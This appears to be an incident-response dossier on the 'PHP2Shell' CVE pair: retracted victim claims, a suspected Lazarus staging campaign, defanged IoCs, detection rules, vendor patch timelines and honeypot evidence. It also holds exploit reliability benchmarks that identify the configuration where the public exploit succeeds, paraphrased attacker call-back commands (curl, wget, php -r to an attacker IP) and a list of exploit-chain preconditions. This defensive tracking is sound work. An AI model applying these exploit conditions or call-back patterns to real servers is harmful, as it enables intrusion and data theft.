### 39.1 (RETRACTED) What we initially got wrong, and why it matters
§30 (dated 2026-10-23 20:00 UTC) said "no publicly confirmed victim". **That was wrong by the time it
was written.** Palo Alto Networks **Unit 42** published a threat brief on **23 October** (updated the
same day, 12:30 p.m. PT) that describes a successful intrusion. We missed it because Unit 42 was not in
our monitored source list; it is now. The mistake was a **coverage gap, not an analytical one** — but on
an incident-status page it is exactly the sentence a customer would quote back at us, so it is corrected
here, in `INCIDENT-STATUS.md` §5b/§7, and on the public page.

### 39.2 (RETRACTED) The claimed case (Unit 42, 23 Oct — withdrawn 25 Oct)
> "In one case, the attackers targeted a government entity in Europe and within two hours of the initial
> exploitation they had successfully accessed password hashes and multi-factor authentication secrets.
> They also established an NT LAN Manager (NTLM)-relay tunnel into Active Directory and attempted Domain
> Admin privilege escalation." — [Unit 42, CVE-2026-109618/CVE-2026-109619 threat brief](https://unit42.paloaltonetworks.com/cve-2026-109618-cve-2026-109619/)

Supporting detail:
- **Time-to-impact: under two hours** from initial exploitation to credential and MFA-secret access.
- **Lateral movement:** NTLM-relay tunnel into Active Directory, attempted Domain Admin escalation —
  i.e. the web server was a route into the identity system.
- **Likely agentic-AI driven:** commands batched inside machine-readable delimiters (`==SHELLUSER==`,
  `==PASSWD==`), short serially-spaced tasks, rapid pivots after failures. Unit 42 reads this as strong
  evidence of an agentic attacker rather than a human operator.
- **Scale context:** Unit 42 estimates **22.6 million** internet-exposed instances were potentially
  vulnerable based on Cortex Xpanse telemetry (vendor telemetry, not a victim count).
- Unit 42 also notes **at least one European government took its website offline as a precaution** —
  distinct from the intrusion above.

**What remains true:** the victim is **unnamed**, no government has publicly confirmed compromise, and
mass exploitation of opportunistic scanners is still largely unsuccessful. **What is no longer true:**
"no confirmed victim anywhere". One confirmed intrusion exists, reported by the vendor's threat-intel
team.

### 39.3 Suspected DPRK-linked staging campaign (CYFIRMA, moderate confidence)
- **216-host** filtered target set, probed **low-and-slow** from **21 compromised nodes** ("nodes are
  rotated and abandoned at the first sign of blocking or rate-limiting, so threshold-based alerting is
  unlikely to catch it" — Kumar Ritesh, CYFIRMA CEO).
- Targets span **government, financial institutions, logistics, airports/aviation, manufacturing and
  online transaction platforms**, across the U.S., Japan, South Korea, Thailand, Indonesia, Australia,
  Taiwan, India, Singapore, the UAE, Saudi Arabia and the EU.
- Attribution is **moderate confidence** to a Korean-speaking operator in the **Lazarus ecosystem**;
  coordination via a closed I2P channel; Munhwaŏ vocabulary cited; prior Lazarus behaviour of
  compromising PHP/WordPress for C2 and web shells (SyncHole).
- CYFIRMA: exploitation is "the next step"; operators planned to shortlist targets and adapt public
  exploits.

**Handling:** this is a *suspected* state-linked staging campaign, attributed at moderate confidence by
one vendor — report it as such, not as established attribution.

### 39.4 Effect on our guidance and detection
- **Nothing in the remediation changes** — patch + restart, `session.upload_progress.enabled=0`,
  restrict PAN-OS management planes, hunt back to 17 Oct.
- **Detection priorities rise:** NTLM relay to AD, anonymous LDAP queries from web servers, LSASS/SAM
  access from PHP worker context, and webshell command batches with `==SHELLUSER==`/`==PASSWD==`
  delimiters. The last is a **new hunting artefact** worth adding to query sets.
- **EPSS context:** the 25 Oct jump to ~0.9998 (§38) is consistent with a confirmed intrusion plus
  state-linked staging — the two signals corroborate each other.
- **CVE-2026-115560 stays as documented:** THN's 25 Oct piece confirms the narrow preconditions, that
  PHP treats it as unlikely, that no emergency fix is coming, and that **no exploitation has been
  reported** — matching our record; it is not part of this intrusion reporting.

### 39.5 CYFIRMA IoC set ingested (2026-10-25)
CYFIRMA publishes a substantial IoC set with the campaign (Section 09 of their advisory), and it is now
in the package (`04-hunting/cyfirma-iocs-2026-10-25.md`), defanged with provenance:

| Set | Count | Handling |
|---|---|---|
| Staging / target-list hosting / launch IPv4 | 15 (+1 possible typo variant) | MONITOR & HUNT |
| Suspected source IPs (web-shell tooling, upload-progress poisoning) | 17 | BLOCK or close-monitor |
| Dropper staging host + URL | `92.118.112[.]100`, `hxxp://…/nfs` | **BLOCK egress** |
| Scanner user-agents | `php2shell-scan/109618`, `php2shell-verify/1.0`, `php2shell-109618`, `Mozilla/5.0 (php2shell-poc)` | DETECT |
| Multipart boundary prefix | `--p2s…` / `--p2shell` | DETECT |
| Blind-RCE canary | `JACKALPOC` in a response = execution | DETECT |
| Malware | SHA-256 `0c5486f0…` (179,632-byte ELF x86-64), MD5 `b61a098f…` | EDR / YARA |
| Behavioural | multipart to non-upload endpoints, PHP worker spawning shells, new `.php` in web roots, `.user_agent`/`.htaccess` prepend, I2P egress | HIGHEST VALUE |

**Three new Suricata rules derived from it** (validated, exit 0): SID 2202610118 (scanner UA family),
**2202610119 (`JACKALPOC` canary in response — means execution succeeded)**, 2202610120 (loader egress
to the dropper host). Rationale: the UA family and the canary survive infrastructure rotation; the IPs
are ephemeral, shared/anonymising, and per CYFIRMA's own guidance should be used for hunting, not as a
blind blocklist. Attribution stays **moderate confidence / suspected**.

### 39.6 RETRACTION — Unit 42 withdrew the 23 October update (verified 25 Oct 21:55 UTC)
The Unit 42 brief now reads:

> "Unit 42 reported earlier that we had observed post-compromise activity that we initially thought was
> related to the PHP2Shell vulnerabilities. What researchers saw was an attack against a European
> government agency executed in the context of a vulnerable PHP application. This led us to believe that
> it was exploitation of those vulnerabilities. **We are unable to confirm that initial access is
> associated with the specific PHP2Shell CVEs. We have retracted our previous update from October 23.**"

Revision history on the page: *"Updated October 25, 2026, at 2:15 p.m. PT to retract our October 23
update."* Removed in the retraction: the European-government intrusion paragraph (<2h to hashes/MFA,
NTLM relay, Domain Admin attempt), the agentic-AI post-exploitation details and the `==SHELLUSER==` /
`==PASSWD==` delimiters. **Still standing:** the 22.6 million exposed-instance estimate (Cortex Xpanse
telemetry), the CVE descriptions and the patching guidance.

**What the retraction does and does not say.** It confirms:
- there **was** a real attack against a **European government agency**, in the context of a **vulnerable
  PHP application**;
- Unit 42 **cannot confirm** initial access came from CVE-2026-109618/109619.

So the honest position is *not* "nothing happened", and *not* "a php2shell victim exists" either. It is:
a government intrusion exists whose initial-access vector is **not attributable to these CVEs on current
evidence**.

**Corrected position (restores §30):** no publicly confirmed victim **tied to these two CVEs**. KEV is
still NO. GUIDANCE: unchanged.

**The lesson — ours, not theirs.** We accepted a single-vendor claim within ~2 hours, promoted it to
"confirmed victim" in the dossier, `INCIDENT-STATUS.md`, the public page and the monitoring prompt. It was
retracted seven hours later. Correct handling would have been to publish it as **vendor-reported and
unverified pending corroboration** — victim claims need either victim confirmation or two independent
sources before the word "confirmed" is used. We did catch the retraction within one hourly cycle, because
we now track the page's own "Updated <date>" string (it has no `dateModified`); that is the one part that
worked as intended.

## 40. ⚠️ FALSE POSITIVE, CORRECTED (26 Oct 00:55 UTC) — the THN article was never updated; reader-proxy variance

> **Correction of an earlier §40.** At 23:55 UTC I recorded that the tracked THN article had been
> "updated but not corrected" (+251 bytes, two new headings). **That was wrong.** Re-checking at 00:55 UTC,
> the page measured 10,940 bytes again — and a **normalised text comparison** across all three captures
> (18:50, 23:55, 00:55) is **byte-identical**. The article never changed.

### 40.1 What actually happened
- THN blocks direct fetches (Cloudflare 403), so it is tracked through a reader proxy (`r.jina.ai`).
- That proxy's markdown output includes **anchor-link suffixes on headings** and other variable
  decorations; its byte size therefore fluctuates by a few hundred bytes between requests.
- My 23:55 diff filtered out lines shorter than 70 characters, which **hid headings in the old copy** but
  not in the new one (where anchor links made them longer) — producing two phantom "added headings".
- **Lesson recorded:** for reader-proxied pages, strip images/links/URLs and markdown decoration and
  compare **normalised text**, not byte sizes. Size/hash are still fine for direct-fetch pages.

### 40.2 Position on the article (unchanged)
The THN article is **not** corrected and still carries the Unit 42 paragraph that Unit 42 retracted on
25 Oct. That statement was, and remains, accurate — it simply was not the result of an update.

### 40.3 Artefacts extracted from the article (not evidence of an update)
These are present in the article as first published; we had simply not extracted them until now:
- Added the `p2s-rider` upload-progress marker as a new detection (SID **2202610121**).
- Hunting doc updated with the GlobalProtect-probe artefact, source IP and ReliaQuest log sequence.
- **No change to victim status** (§39.6 stands): the article's headline claim remains retracted by Unit 42.

## 41. Independent government vendor-status resource (NCSC-NL) — 2026-10-26

Found during the 02:55 UTC cycle: **`NCSC-NL/php2shell`** (Dutch government CERT), **~298★ / 101 forks**,
created 21 Oct, updated **hourly** (pushed 02:46 UTC at time of triage), **TLP:CLEAR**.

| Aspect | Detail |
|---|---|
| Layout | `software/software_list_<letter>.md` (31 files), `software/changelog_software_list.md` (~530 KB), `detection_mitigation/`, `tools/`, `tests/` |
| Granularity | supplier · product · versions · **status per CVE** (`Vulnerable` / `Fix` / `Not vuln`) · vendor-advisory links |
| Value | covers **embedded PHP in commercial products** — the gap our distro patch matrix cannot fill |
| Caveat | entries are *investigation leads* until backed by the vendor advisory (repo states this) |

**PAN-OS cross-check:** NCSC-NL lists PAN-OS 12.2/12.1/11.2/11.1/10.2 and Panorama as **Vulnerable,
fixed releases not yet announced** — **independent confirmation** of our `PAN-OS-EXPOSURE.md` position
(fixes pending, ETAs 27–30 Oct). It adds no claim of appliance-specific RCE.

**Action:** referenced in `PATCH-AVAILABILITY.md`; monitoring now tracks the repo README so vendor-status
activity is visible. We do not copy the list (it is large and hourly-changing) — we cite it and use it as
the lookup layer for customer "is product X affected?" questions.

## 42. 🚨 TOP ESCALATION (2026-10-26) — PAN-OS hotfixes have started shipping

### 42.1 What changed and how it was caught
The 05:55 UTC cycle flagged a **PAN advisory revision** (`pending_fix_rows` 17 → 13,
`advisory_updated 2026-10-25 → 2026-10-26`). Initial ambiguity — the Solution text still says "will be
fixed in upcoming releases" — was resolved by reading the advisory's **own Timeline section**:

> "2026-10-26 Removed the ETAs for 11.1.4-h38, 11.1.6-h40, 11.1.10-h36 and 11.1.13-h16 **as these
> versions are released**."
> "2026-10-25 Updated the Frequently Asked question (FAQ) section. Also, removed the ETA for
> 10.2.18-h13, 11.1.16-h4 and 11.2.10-h16 **as these versions are released**."

Corroborated by PAN-OS release notes: e.g. *"The PAN-OS 11.1.13-h16 release includes a fix to address
CVE-2026-109618"* and the equivalent for 10.2.18-h13.

### 42.2 Fix status by branch (2026-10-26)
| Status | Builds |
|---|---|
| **Released 25 Oct** | `10.2.18-h13` · `11.1.16-h4` · `11.2.10-h16` |
| **Released 26 Oct** | `11.1.4-h38` · `11.1.6-h40` · `11.1.10-h36` · `11.1.13-h16` |
| Pending (ETA) | `11.1.7-h12` 10/30 · `11.2.4-h23` 10/30 · `11.2.7-h23` 10/29 · `11.2.13-h4` 10/27 · `11.2.16-h1` 10/28 · `10.2.7-h39` 10/30 · `10.2.10-h42` 10/29 · `10.2.13-h27` 10/27 · `10.2.16-h12` 10/28 · `12.1.4-h13` 10/29 · `12.1.7-h11` 10/28 · `12.1.10-h3` 10/30 · `12.2.4-h1` 10/28 |

**No fix date:** Panorama. **WildFire WF-500/WF-500-B: NOT affected** (vendor correction, 23 Oct — see §45).
25 Threat Prevention IDs unchanged.

### 42.3 Monitoring gap this exposed (and the fix)
Our monitor treated only `(ETA: …)` rows as pending and had **no notion of "released"** — the 25 Oct
releases were missed because the advisory update was attributed to an FAQ revision, and the timeline text
was never parsed. The 26 Oct drop was nearly misfiled as a parse artefact. Fix:
- Parse the advisory **Timeline** for `removed the ETA for … as these versions are released` →
  emit `pan.released_builds=…` and `pan.release_timeline=…`.
- Keep the three-state pending logic; released builds are now positively reported, not inferred from
  missing ETAs.
- **Lesson:** "no ETA" is not evidence either way — read the vendor's release timeline.

### 42.4 Customer action
- Branch has a released build → **upgrade now**, then re-verify management-interface exposure.
- Branch still pending → interim controls (restrict MGT access, route MGT through a DP port, replace
  inbound cert, decrypt inbound, enable Threat Prevention; Threat IDs 543004 + 97622–97678).
- **Panorama** → no fix; keep management access tightly restricted. **WF-500/WF-500-B** → not affected.
- Do not assume web-server patching covers the appliance; PAN-OS ships its own embedded PHP.

## 43. Defensive ecosystem: exposure-discovery resources (2026-10-26)

**`cseelhoff-ms/php2shell-hunting-pack`** — Microsoft-authored hunting pack (Defender / Sentinel / Azure
tooling), created 21 Oct, updated 26 Oct. Fills a gap none of our artefacts cover: **asset discovery**
("top 10 ways to find vulnerable PHP assets" via Defender Vulnerability Management, Defender for Cloud,
EASM, Azure Resource Graph), rather than log-based exploitation hunting.

Two things worth borrowing:
- **"An empty CVE/TVM result does not mean not vulnerable"** — version detection misses embedded PHP and
  distro backports. This matches our `START-HERE.md` inventory guidance and is a good line for customer
  conversations.
- Pairing **exposure discovery** (their pack) with **exploitation detection** (our Suricata/YARA/Sigma) —
  different jobs; estates need both.

Referenced (unverified by us, no exploit code) in `04-hunting/hunting-queries-v2.md` alongside the
NCSC-NL vendor-status list.

### 43.1 Monitoring note — NVD 503
This cycle's NVD fetches failed (`nvd.*.parse=FAIL`); direct retest returned **HTTP 503** from
services.nvd.nist.gov. Source-side throttling/outage, not a monitor defect — the sweep and per-CVE records
will be re-checked next cycle. Single occurrence only; escalate if it persists 2+ runs.

## 44. 🚨 CAPABILITY UPDATE (2026-10-26) — public exploit now clears MULTI-WORKER pools

### 44.1 What prompted it
The repo tracker showed `JoasASantos/php2shell-exploit` pushed at **2026-10-26 12:50** (first code change
since 24 Oct). Changelog: *"Merge pull request #3 from MNTMDEV/main"* — PR titled **"Exploit Stability
Enhancement"**: *"use dedicated nc reverse shell to prevent thread hold, **fix worker count estimate
bug**, support keep-alive recon"*, touching `exploit.py`, `lib/worker_pin.py`, `recon.py`.

### 44.2 Our re-test (independent of the tool's own claims)
Lab: `php:8.4.26-apache`, stock `php.ini-production` (**display_errors=Off**), upload progress On,
**default Apache prefork pool** (StartServers 5; 75 apache2 processes observed during the run — no worker
pinning of any kind applied to the server).

Initial spot check: 3 attempts, 2 successes. **A proper benchmark (n=28 total) shows that was
optimistic luck** — see §44.6 for the corrected numbers.

### 44.3 Effect on our assessments
- **Supersedes the "single worker required" caveat** in §35 and in `INCIDENT-STATUS.md` §4b / `START-HERE.md`.
- **Default Apache prefork deployments are in scope for the public tool** — but **multi-worker
  reliability is poor** (§44.6: **2/13**). Worker count is not a *control*, yet it remains a **strong
  reliability factor**: single-worker 15/15 vs multi-worker 2/13.
- Target shape is still mod_php + prefork; FPM is not covered by this tool.
  `session.upload_progress.enabled=0` still breaks the path; patching remains the fix.
- The *silent memory-disclosure* mode is unchanged and independent of worker count.

### 44.4 Monitoring gap closed
This update was nearly missed: the repo tracker only surfaced stars, and we noticed the commit because a
star count moved. `check.sh` now tracks **`pushed_at` for key repos** (Joas exploit, xuehuolll PoC,
HOSTED-POWER guard, NCSC-NL) as `repo.<name>.pushed=…`, so new code is a first-class signal rather than
a lucky observation.

### 44.5 Note on a second repo
`xuehuolll/php2shell-CVE-2026-109618-109619` (47★, v2.1 released 26 Oct) claims "a working remote chain
on stock php.ini-production, four more exploit paths, and post-patch evidence". Its own analysis commit
states an "8M chain also fails on 8.4.20/8.5.11". **We have not tested it**; treat as unverified. Our
verified capability statement rests on the Joas tool (§35, §44.2).

### 44.6 Reliability benchmark (2026-10-26, n=28, absolute measurements)
Same exploit build, same target (`php:8.4.26-apache`, stock `php.ini-production`, `display_errors=Off`,
`session.upload_progress=On`), private loopback lab; per-attempt budget `--timeout 45`; success =
`BENCH_MARKER` echoed back through the exploit's command execution.

| Arm | Pool | Success | Median attempt |
|---|---|---|---|
| **Single-worker** | `MaxRequestWorkers=1`, StartServers 1 (2 procs) | **15/15 (100%)** | ~5 s |
| **Multi-worker** | default: StartServers 5, MaxRequestWorkers 150 (6 idle procs, more under load) | **2/13 (15%)** | ~62 s (failures burn retries) |

**Interpretation (supersedes the 2/3 spot check):**
- The 26 Oct upstream fix does **not** make multi-worker reliable. It makes multi-worker *sometimes
  reachable* — a capability change, but a marginal one.
- **Single-worker remains the reliable configuration (100%)**, so the earlier "single worker" note was
  about *reliability*, not a security control. Reporting nuance: "worker count does not protect you, but
  it does reduce an attacker's success probability to roughly one attempt in seven in our lab".
- Failures on multi-worker were consistent: the leak stage rarely lands on a worker that is reused in
  the attacker's favour; a single worker guarantees reuse.
- These are **lab figures** — production results vary with memory_limit, request pacing, traffic and the
  application's session behaviour.


## 45. CORRECTION (2026-10-26) — WildFire WF-500 / WF-500-B are NOT affected

### 45.1 What we had wrong
Our PAN-OS material carried, since 23 Oct, the line "Panorama and WF-500/WF-500-B have no fix date". That
was based on a 23 Oct advisory revision that briefly listed the WildFire appliances as in scope.

### 45.2 What the primary source says now
Palo Alto's advisory product table lists **WildFire Appliance WF-500 and WF-500-B: affected = None,
unaffected = All**. Its timeline records the fix: *"2026-10-23 … made the correction to the status of
WildFire Appliance WF-500 and WF-500-B impact."* So the appliances were **briefly mis-listed and corrected
the same day**; the correction predates our statement, which means we kept a stale line for three days.

**Panorama remains affected.** The advisory note is explicit: *"This issue is applicable to PAN-OS software
on PA-Series and VM-Series firewalls and on Panorama (virtual and M-Series)."* No fixed version or date is
listed for Panorama.

### 45.3 Impact
- Customers with WF-500 appliances were told to treat them as exposed and wait for a non-existent fix.
  That is unnecessary work and a credibility cost. Corrected across `PAN-OS-EXPOSURE.md`,
  `PATCH-AVAILABILITY.md`, `START-HERE.md` and this dossier.
- Panorama guidance is unchanged: affected, no fix date, keep management access restricted.

### 45.4 Monitoring gap and fix
The monitor parsed released builds and pending ETAs, but **not product status rows**, so a vendor
correction to affected/unaffected could not surface. `check.sh` now emits
`pan.wf500_status=…` (and the WildFire Cloud row) from the advisory product table, so the next correction
is detected rather than inherited.

### 45.5 Why this is recorded rather than quietly fixed
Walking back a claim is worse than never making it, but silently editing it is worse still. The error
came from trusting an earlier revision and never re-reading the table; the fix is a parser signal, not a
promise to be more careful.


## 46. 10.2 branch release notes published ahead of the advisory (2026-10-26 23:59 UTC)

Palo Alto's per-release documentation for **`10.2.13-h27`** and **`10.2.16-h12`** is live, and both pages
state the release "includes a fix to address CVE-2026-109618". The advisory still listed `ETA: 10/27` and
`ETA: 10/28` at the same moment. These are the **only** two of the thirteen pending builds with
documentation published: `11.1.7-h12` (the other `h12`) returns 404, so it is not out.

Interpretation: documentation publication is a leading indicator that a build is available or imminent,
while the advisory update lags. Neither signal alone is sufficient, so `check.sh` now tracks both:
`pan.released_builds` (advisory timeline) and `pan.rn_pending_documented` (docs pages, HEAD-checked).

## 47. 🚨 ESCALATION (2026-10-27 01:55 UTC) — PAN-OS 10.2 builds now officially released: 10.2.13-h27, 10.2.16-h12

### 47.1 What changed
The PAN advisory was updated on **27 October** (`Updated 2026-10-27`) and the **ETAs for `10.2.13-h27` and
`10.2.16-h12` were removed**, which is the advisory's way of saying they are released. The product table now
reads `>= 10.2.13-h27` and `>= 10.2.16-h12` with no ETA. Monitor signals:

| Signal | Before | After |
|---|---|---|
| `pan.released_builds` | 7 builds (25–26 Oct) | **9 builds** (adds `10.2.13-h27`, `10.2.16-h12`) |
| `pan.timeline_latest` | 2026-10-26 | **2026-10-27** |
| `pan.pending_fix_rows` | 13 | **11** |
| `pan.advisory_updated` | 2026-10-26 | **2026-10-27** |

This closes the docs-first window documented in §46: the release-notes pages existed before the advisory
flipped, and the monitor now confirms both states independently.

### 47.2 What it means for customers on PAN-OS 10.2
- **10.2.13 branch:** upgrade to `10.2.13-h27` or later. PAN's own guidance for 10.2.11 through 10.2.13-h*
  names `10.2.13-h27` or `10.2.18-h13`.
- **10.2.16 branch:** upgrade to `10.2.16-h12` or later. For 10.2.14 through 10.2.16-h*, `10.2.16-h12` or
  `10.2.18-h13` is the fixed path.
- After upgrading, re-verify management-plane exposure and review whether anything reached it.
- Branches without a release yet: 11.1.7-h12 (10/30), 11.2.4-h23 (10/30), 11.2.7-h23 (10/29),
  11.2.13-h4 (10/27), 11.2.16-h1 (10/28), 10.2.7-h39 (10/30), 10.2.10-h42 (10/29), 12.1.4-h13 (10/29),
  12.1.7-h11 (10/28), 12.1.10-h3 (10/30), 12.2.4-h1 (10/28). **Panorama still has no fix date.**

### 47.3 Verification note
The release-notes pages were already live on 26 Oct (see §46), so this was a confirmation rather than a
surprise. The monitor caught the transition in the first cycle after it happened, through the timeline
parser, without requiring a docs re-check.

## 48. 🚨 ESCALATION (2026-10-27 04:55 UTC) — 12.1.7-h11 and 12.2.4-h1 released ahead of ETA

### 48.1 What changed
In the 04:55 UTC cycle the advisory's timeline added two builds that were not due until 28 October:

| Build | Previous ETA | Now |
|---|---|---|
| `12.2.4-h1` | 10/28 | **released** |
| `12.1.7-h11` | 10/28 | **released** |

Monitor signals: `pan.released_builds` 9 → **11**; `pan.pending_fix_rows` 11 → **9**; advisory updated
2026-10-27. Verified against the product table: `>= 12.2.4-h1` and `>= 12.1.7-h11` carry no ETA. The other
12.1 builds are still pending: `12.1.4-h13` (10/29) and `12.1.10-h3` (10/30).

### 48.2 Meaning
- **Panorama remains the outlier**: still affected with no published fix date, despite its management
  plane sharing the affected code path.
- 12.1 administrators on earlier builds should use `12.1.7-h11` if their maintenance window allows; the
  broader 12.1 branch still waits for `12.1.4-h13` and `12.1.10-h3`.
- 12.2 administrators can close this out now with `12.2.4-h1`.
- Nine builds remain pending, with `11.2.13-h4` still the next expected release.


## 49. Appliance-vendor gap filled (2026-10-27) — Citrix NetScaler and Cisco

### 49.1 Why this matters
Our appliance coverage was PAN-OS-only. A 20-star community checker that surfaced in the repo tracker
pointed at **Citrix advisory CTX697263**, which we had missed. The same class of product (network appliance
with an internet-reachable management plane and an embedded PHP runtime) is the part of the exposure
picture most likely to be omitted from "patch your web servers" messaging.

### 49.2 Citrix NetScaler ADC / Gateway — impacted, fixes published 27 Oct
Advisory CTX697263 (created 22 Oct, updated 27 Oct; severity critical). Affected: NetScaler ADC and
NetScaler Gateway. Fixed: **14.1-73.49**, **13.1-64.32**, plus FIPS lines **14.1-73.49 FIPS** and
**13.1.37.286** (13.1-FIPS / 13.1-NDcPP). Not affected: Console, Analytics, Endpoint Management,
Observability, StoreFront, Workspace App, XenServer and others. Citrix cloud services were remediated
before publication. Citrix's interim guidance is management-access restriction, the same control we
recommend for PAN-OS.

### 49.3 Cisco — partly affected, fixes mostly pending
Cisco advisory cisco-sa-php-october26-Jj384Daq (updated 26 Oct). Affected: **Expressway Series / Select**
(CSCwx37062, fix **15.5.21**, date TBD), **URWB** (CSCwx37073, **27.1.1** planned Feb 2027; requires admin
auth, CVSS 6.6, workaround available), **Duo Access Gateway** (fixed in **3.2.0**). Other products remain
under investigation; unlisted products are treated as not affected by Cisco's own rule.

### 49.4 Process lesson
The monitor watches PAN because PAN is where the vendor advisory was found early. It had no watch for
other appliance vendors, so a community project surfaced Citrix before we did. Added to
`PATCH-AVAILABILITY.md` §8c with a standing instruction: if an appliance has a PHP runtime and a public
management interface, check the vendor advisory rather than assuming it is covered by distro patching.


## 50. 🚨 TOP ESCALATION (2026-10-27) — CISA KEV listed both CVEs; working RCE confirmed in the wild

### 50.1 What changed
1. **CISA KEV:** both CVEs are in the catalog version **2026.10.26** (released 2026-10-26T22:24Z), added
   **2026-10-26**, **remediation due 2026-10-29**. Catalog size 1,756 → 1,758.
2. **NVD enrichment (27 Oct):** refs 109618 5 → **8**, 109619 14 → **17**. New references: the CISA KEV
   pages, an Arctic Wolf analysis, and `php2shell.delftintellab.com`. Status remains `Analyzed`.
3. **Working in-the-wild RCE:** Perplexity detection lead **Adel Karimi** reported **35 shells launched
   across three honeypots** on **24 Oct**, against **Apache mod_php PHP 8.4.26, single worker**, using a
   four-stage request chain closely matching the public PoC. Expel's Marcus Hutchins called it the
   highest-quality confirmation so far. No second-stage payload was observed.
4. **No named victim:** as of this entry, no organisation has publicly confirmed compromise through these
   CVEs. The Unit 42 European-government claim remains retracted (§39.6).

### 50.2 What it means
- **"Not yet exploited" is over.** The vulnerability is in KEV with a 29 Oct due date; patching is now a
  deadline question, not a judgement call.
- **The honeypot result matches our capability findings:** single-worker mod_php, PHP 8.4.26,
  `display_errors=Off`, four-stage chain. That is the same configuration we benchmarked at 15/15 success
  on single-worker and 2/13 on multi-worker. It also confirms the public PoC was weaponised in the wild,
  not just published.
- **Victim attribution remains absent.** KEV and honeypot shells say exploitation is happening; they do
  not say who was breached. Customer guidance should say exactly that.

### 50.3 Process failure: we were ~14 hours late on KEV
The monitor caught the KEV change at its first cycle (snapshot 2026-10-26T23:39Z; catalog 1,758,
`kev.IN_KEV=…`). **Reporting missed it for ~14 hours** because:
- the run that caught it was filtered to `grep -iE "pan|publish"` while debugging the PAN docs-first
  state, so the KEV lines never reached the report copy; and
- subsequent cycles showed no KEV change (baseline already contained it), while the reminder prompt's
  stale "KEV NO (1,756)" fact was repeated without checking the live signal.

**Fix:** `check.sh` now prints a prominent **ALERTS** block at the **top of every run**, before the diff,
listing: KEV listing, PAN-OS released-build changes, and PAN product-scope changes. The KEV signal also
emits the playbook-compatible `kev.php2shell_in_kev=YES` again (it had drifted to `IN_KEV=` lines only).
Reporting rule: read the ALERTS block and the KEV signal every cycle, never the prompt's cached facts.


## 51. EPSS at ceiling (2026-10-27) — both CVEs 0.99999, verified against the official dataset

First's 27 October daily dataset (checked against `epss_scores-2026-10-27.csv.gz`, not just the API) shows
**both CVEs at 0.99999**:

| CVE | 25 Oct | 27 Oct | Percentile |
|---|---|---|---|
| CVE-2026-109618 | 0.99981 | **0.99999** | 0.99998 |
| CVE-2026-109619 | 0.99997 | **0.99999** | 0.99999 |

The move is the expected model response to a KEV listing plus confirmed exploitation, not a new
vulnerability development. EPSS states the probability of exploitation activity in the next 30 days across
the internet; it is not a per-host verdict. The 25 October values remain correct as history (see §38).


## 52. PRIMARY EVIDENCE (2026-10-27) — 0x4D31 honeypot dataset: 35 shells, digests, fingerprint

### 52.1 What arrived
Adel Karimi (0x4D31) published the underlying dataset behind the "35 shells on honeypots" reporting:
`github.com/0x4D31/honeypot-data`, `reports/php2shell/` with two reports and a per-case evidence directory
(HTTP pcaps plus Apache, PHP, Tetragon and signal records for cases `A01`–`A03`, `B01`–`B32`).

Previously our §50 relied on press coverage of this claim. This is the primary record, and it is stronger
than the coverage suggested.

### 52.2 What it establishes
- **35 execution-stage POSTs correlated with 35 `/bin/sh` starts parented by Apache workers** (`uid=33`)
  across three targets. Two source clusters, not two actors: `15.204.59[.]70` (3 shells) and
  `162.35.99[.]94` (32 shells). `104.28.208[.]84` and `144.48.4[.]242` sent exploit-shaped traffic but
  produced no shell and no disclosure cookie: attempts, not RCE.
- **Leak-guided ASLR adjustment per target**: the dominant disclosed pointer differs across targets and
  B2 tracks the difference. The chain is consistent with **CVE-2026-109618**; the records do **not**
  establish a distinct CVE-2026-109619 path.
- **Exact fingerprint**: multipart POST to `/` or `/index.php`, **no User-Agent**, ten-character `C`
  boundary, fixed header order, four stages of 1,060,211 B (chunked) → 33,128,677 B (chunked) →
  279,369 B → 451,384 B, with `PHPSESSID` and `PHP_SESSION_UPLOAD_PROGRESS` in every stage and an
  819,200-byte `PHPSESSID` disclosure cookie.
- **Fixed decoded-body digests** for A1/B1/A2, and per-case B2 digests (16 distinct). These enable exact
  matching where body capture exists.
- **Command patterns**: proof writes (`id>/tmp/x1`, web-root writes), and call-backs via `php -r`, `curl`
  or `wget` to `162.35.99[.]94` ports 80/8080 with `/pwn-…`, `/PROOF-…`, `/ID-…$(id -un)-$(hostname)`.

### 52.3 What it changes in our analysis
1. **Our newest Suricata rule was validated in the wild.** SID `2202610123` keys a fixed single-character
   boundary; the attackers used exactly `CCCCCCCCCC`, the same constant the public tool hardcodes. We also
   added a no-User-Agent fingerprint rule (SID `…125`) and a B2 size rule (`…126`).
2. **A new Sigma rule** for the decisive signal: Apache worker → shell (SID-range Sigma, level high).
3. **Nuance on 9bie**: the traffic "closely matches the public 9bie HTTP-only PoC family", yet early chains
   contained no pointer above that revision's `0x7f0000000000` filter, so a modified PoC, another revision
   or a different client was used. Our earlier lab result (9bie revision failed end-to-end) and this
   in-the-wild success are compatible: same family, different build.
4. **Reliability context holds**: the honeypots were single-worker mod_php, the profile we benchmarked at
   15/15. This confirms the favourable case, not the multi-worker average (2/13).

### 52.4 What it does not establish
No named victim, no CVE-2026-109619 path, no attribution, and no reliability measurement beyond the
single-worker profile. Customer wording should reflect that.


### 52.5 Attempts versus successes — what the dataset can and cannot support
Across both honeypot reports there are **72 distinct source addresses**: 66 in the 26h43m attempt window and
6 in the ~3h40m RCE window, with **zero overlap**. Only **two** sources produced confirmed shells, so
source-level conversion is roughly **3%**, and the successful sources were not the earlier attempt sources.
The RCE window recorded **52 disclosure cookies and 35 shells** (~67% leak-to-shell, indicative only, since a
B2 may reuse a leak). The attempt window itself had 4,227 access records, 30 OOM triggers and 11 worker
crashes with **zero shells**. A request-level success rate cannot be computed: capture selection, incomplete
streams and body reuse all break the denominator. Treat any "one in N requests" figure as unsupported.


## 53. UNVERIFIED CLAIM (2026-10-27) — FPM-only "full RCE" PoC appeared; could not reproduce

### 53.1 What was published
`VABISMO/php2shell-nginx-fpm-full-rce` (public, ~427 KB, Python client plus a user-prefix nginx + PHP-FPM
lab). Claims a full **nginx + PHP-FPM** chain for CVE-2026-109619 via the `BG(unserialize)` stale-state path,
with profiles for PHP 8.0 through 8.4.26 and a session-file plant for 5.4-7.x. README claims verified output
on 8.4.26 with a proof file and describes a "default-installation mode" (one pool, one port,
`memory_limit=128M`, `pm=dynamic`, `post_max_size=8M`).

### 53.2 What a real target still needs (author's own checklist)
This is **not** a generic FPM exploit. It requires:
1. vulnerable 8.x FPM build (8.0-8.4.26, 8.5.0-8.5.11);
2. an application operation calling `session_start()`;
3. a session that stores a **reference** (`R:N`);
4. a **reflection** of a session value (leak channel), or supplied bases;
5. an operation that decodes attacker-controlled session data (`session_decode`) or appends attacker data to
   the session;
6. bodies of ~5 MB accepted by the front (stock nginx `client_max_body_size` is 1m and fails; Apache has no
   such cap).

